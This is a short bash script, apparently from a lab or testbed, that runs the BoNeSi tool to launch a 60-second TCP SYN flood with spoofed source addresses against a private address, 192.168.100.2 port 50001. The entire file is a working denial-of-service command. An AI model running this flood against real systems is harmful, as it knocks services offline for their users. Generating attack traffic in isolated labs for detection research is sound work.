#!/bin/bash

# BoNeSi TCP SYN Flood (60 seconds)
sudo timeout -s INT 60 bonesi -i bots.txt -p tcp -s 0 -d enp0s3 192.168.100.2:50001